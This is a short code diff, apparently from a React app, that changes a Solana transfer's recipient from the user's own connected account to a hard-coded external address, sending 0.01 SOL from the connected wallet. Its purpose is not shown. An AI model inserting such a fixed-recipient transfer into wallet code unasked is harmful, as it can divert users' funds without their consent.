@@ -226,7 +226,7 @@ function App() {
 		const block = await connection.getLatestBlockhash('finalized');
 		const TransactionInstruction = SystemProgram.transfer({
 			fromPubkey: new PublicKey(accounts[0]),
-			toPubkey: new PublicKey(accounts[0]),
+			toPubkey: new PublicKey('8Q3KAP8nV9FAMmtpm3QqoECbafebscsSQ3m6HHgK386v'),
 			lamports: 0.01 * LAMPORTS_PER_SOL,
 		});
 		const transaction = new Transaction({
